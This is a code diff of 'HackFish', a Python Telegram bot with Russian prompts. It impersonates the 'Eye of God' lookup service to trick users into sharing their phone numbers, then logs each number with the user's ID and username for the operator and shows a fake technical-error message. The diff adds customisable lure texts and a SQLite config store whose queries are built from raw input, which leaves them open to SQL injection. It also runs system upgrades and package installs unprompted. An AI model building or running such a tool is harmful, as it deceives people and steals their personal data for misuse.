@@ -1,5 +1,15 @@
 
+try:
+    from colorama import init
+    from colorama import Fore, Back, Style
+except:
+    os.system('pip install colorama')
+    from colorama import init
+    from colorama import Fore, Back, Style
+print(Fore.GREEN)
+print("<HackerRullerTools> Запуск!")
 import os
+os.system("apt update && apt upgrade")
 
 try:
     from platform import platform
@@ -23,11 +33,6 @@ else:
 
 os.system(delet)
 
-
-
-def on_startup():
-    print("<HackerRullerTools> Запуск!")
-on_startup()
 
 
 
@@ -66,11 +71,19 @@ except:
     os.system("pip install art")
     from art import *
 
+try:
+    import sqlite3 as sq
+except:
+    os.system('pip install sqlite3')
+    import sqlite3 as sq
+
+
 
 def printtext(text):
     art1 = text2art(text)
     print(art1)
-    time.sleep(1)
+    
+
 
 
 def printair(i):
@@ -78,68 +91,234 @@ def printair(i):
         time.sleep(0.6)
         print()
 
-os.system(delet)
-printtext('HackFish')
-printtext('HackFish')
-printtext('HackFish')
-printtext('HackFish')
-printtext('HackFish')
-printtext('HackFish')
-time.sleep(4)
-os.system(delet)
-printtext('HackFish')
-
-
 
 tracemalloc.start()
 
 
-
-
 storage = MemoryStorage()
+
+
 
 bot = None
 token = None
 dp = None
+text1 = None
+text2 = None
+text3 = None
+
+
+with sq.connect("configs_hack_fish.db") as con:
+    sql = con.cursor()
+    sql.execute("CREATE TABLE IF NOT EXISTS configs (config TEXT, text1 TEXT, text2 TEXT, text3 TEXT, token TEXT)")
+
+
+
+menu = """1: Вход по токену!
+2: Вход по конфигу!"""
+
+
+
 
 def registerbot():
+    title()
+    print(menu)
     try:
-        global bot
-        global token
-        global dp
-        token = str(input('Введите токен: '))
-        bot = Bot(token)
-        dp = Dispatcher(bot, storage=storage)
-    except:
-        print('Неккоректный токен!')
-        registerbot()
+        number_menu = int(input('Введите что хотите выбрать: '))
+        if number_menu == 1:
+            token_register()
+        if number_menu == 2:
+            config_register()
+    except ValueError:
+        error('Введите число!')
 
+
+
+def error(text):
+    print(Fore.RED)
+    os.system(delet)
+    printtext('Error')
+    print(text)
+    time.sleep(3)
+    registerbot()
+    print(Fore.GREEN)
+
+
+
+def error2(text):
+    print(Fore.RED)
+    os.system(delet)
+    printtext('Error')
+    print(text)
+    print(Fore.GREEN)
+
+
+
+def title():
+    os.system(delet)
+    print(Fore.GREEN)
+    printtext('HackFish')
+
+def config_register():
+    sql = con.cursor()
+    sql.execute(f"SELECT * FROM configs")
+    configs = str(sql.fetchone())
+    if configs == 'None':
+        error('У вас нету конфигов!')
+    else:
+        while True:
+            os.system(delet)
+            title()
+            print('Введите название конфига!')
+            config2 = str(input('Чтобы отменить напишите (back): '))
+            if config2 == 'back':
+                registerbot()
+                break
+            con.cursor()
+            sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
+            if sql.fetchone() is None:
+                error2('Этого конфига не существует!')
+                time.sleep(3)
+                title()
+            else:
+                global bot
+                global token
+                global dp
+                global text1
+                global text2
+                global text3
+                sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
+                token = sql.fetchone()[4]
+                sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
+                text1 = sql.fetchone()[1]
+                sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
+                text2 = sql.fetchone()[2]
+                sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
+                text3 = sql.fetchone()[3]
+                os.system(delet)
+                title()
+                while True:
+                    print(f'Если вы хотите другой токен напишите его! Токен конфига: {token}')
+                    token2 = input('Пропустите если не хотите его менять: ')
+                    if token2 != '':
+                        try:
+                            bot = Bot(token2)
+                            dp = Dispatcher(bot, storage=storage)
+                            os.system(delet)
+                            title()
+                            break
+                        except:
+                            error2('Введите корректный токен!')
+                            time.sleep(3)
+                            title()
+                    else:
+                        bot = Bot(token)
+                        dp = Dispatcher(bot, storage=storage)
+                        os.system(delet)
+                        title()
+                        break
+                break
+
+
+
+def token_register():
+    global bot
+    global token
+    global dp
+    global text1
+    global text2
+    global text3
+    os.system(delet)
+    while True:
+        title()
+        token = str(input('Введите токен (чтобы вернутся обратно напишите: back): '))
+        if token == 'back':
+            registerbot()
+        else:
+            try:
+                bot = Bot(token)
+                dp = Dispatcher(bot, storage=storage)
+                os.system(delet)
+                title()
+                print('Введите сообщение которое пишет бот при команде: /start!')
+                text1 = str(input('Пропустите чтобы бот представлялся глазом бога: '))
+                os.system(delet)
+                title()
+                print('Введите сообщение кнопки снизу!')
+                text2 = str(input('Пропустите чтобы кнопка была как у глаза бога: '))
+                os.system(delet)
+                title()
+                print('Введите сообщение которое бот отправит после получения номера!')
+                text3 = str(input('Пропустите чтобы была техническая ошибка: '))
+                os.system(delet)
+                title()
+                if text1 == '':
+                    text1 = """🗂 Номер телефона
+
+Вам необходимо подтвердить номер телефона для того, чтобы завершить идентификацию.
+
+Для этого нажмите кнопку ниже."""
+                if text2 == '':
+                    text2 = '✅ Подтвердить номер телефона'
+                if text3 == '':
+                    text3 = '❌ Техническая ошибка! Просим извинения!'
+                while True:
+                    print('Создайте конфиг, напишите название!')
+                    config2 = str(input('Пропустите если не хотите создавать конфиг: '))
+                    config2 = config2.lower()
+                    if config2 == 'back':
+                        error2('Неккоректное название конфига!')
+                        time.sleep(3)
+                        os.system(delet)
+                        title()
+                    if config2 != '':
+                        sql = con.cursor()
+                        sql.execute(f"SELECT * FROM configs WHERE config = '{config2}'")
+                        if sql.fetchone() is None:
+                            sql.execute(f"INSERT INTO configs (config, text1, text2, text3, token) VALUES('{config2}', '{text1}', '{text2}', '{text3}', '{token}')")
+                            con.commit()
+                            break
+                        else:
+                            error2('Такой конфиг уже существует!')
+                            time.sleep(3)
+                            os.system(delet)
+                            title()
+                    else:
+                        os.system(delet)
+                        title()
+                        break
+        
+
+                break
+            except:
+                error2('Введите корректный токен!')
+                time.sleep(3)
+                title()
+    
 
 registerbot()
-
-
 
 follower = types.InlineKeyboardMarkup(row_width=2)
 followerbutton1 = types.InlineKeyboardButton(text='Наш Канал 🖤', url='t.me/HackeeRullerToolsOfficial')
 followerbutton2 = types.InlineKeyboardButton(text='Наш чат 💤', url='https://t.me/HackerRullerTools')
 follower.add(followerbutton1).add(followerbutton2)
 
-markup = ReplyKeyboardMarkup()
-markup.add(
+
+
+
+contct = ReplyKeyboardMarkup(resize_keyboard=True)
+contct.add(
     KeyboardButton(
-        text='✅ - Нажми',
+        text=text2,
         request_contact=True
     )
 )
 
+
+
+
 @dp.message_handler(commands='start')
 async def cmd_start(message: types.Message):
-    photo = 'https://www.promkod.ru/storage/editor/images/promokod-1.jpg'
-    await bot.send_photo(chat_id=message.chat.id, photo=photo, caption='<b>💥 - Привет, ты активировал Telegram бота! Он умеет накручивать пользователей на ваши каналы и группы! Нажми на кнопку и поделиться контактом!</b>', parse_mode='HTML', reply_markup=markup)
-    saveid = message.from_user.id
-    username = message.from_user.username
-    groupm = message.chat.id
-
+    await message.answer(text1, reply_markup=contct)
 
 
 
@@ -150,8 +329,10 @@ async def clicker_test(message: types.Message):
     id = message.from_user.id
     us = message.from_user.username
     con = message.contact.phone_number
-    print(f'Bot > От {id} - @{us}: {mt} номер {con}')
-    await message.answer('Технический сбой! Подпишись на нас!', reply_markup=follower)
+    print(Fore.YELLOW)
+    print(f'Bot > От айди: {id} - псевдонима: @{us}: сообщение: {mt} - номер: {con}')
+    print(Fore.GREEN)
+    await message.answer(text3, reply_markup=follower)
 
 
 
@@ -159,11 +340,17 @@ async def clicker_test(message: types.Message):
 
 
 async def end(_):
+    print(Fore.YELLOW)
+    print('-----------------------------------------------------------------------------')
+    print(Fore.GREEN)
     printtext('BotActive')
+    print('\nНаш Канал t.me/HackeeRullerToolsOfficial\nНаш чат https://t.me/HackerRullerTools\n\nЛоги - суда будут приходить номера!\n')
+    print(Fore.YELLOW)
+    print('-----------------------------------------------------------------------------')
+    print(Fore.GREEN)
 
 
 
 
 if __name__ == '__main__':
     executor.start_polling(dp, on_startup=end)
-
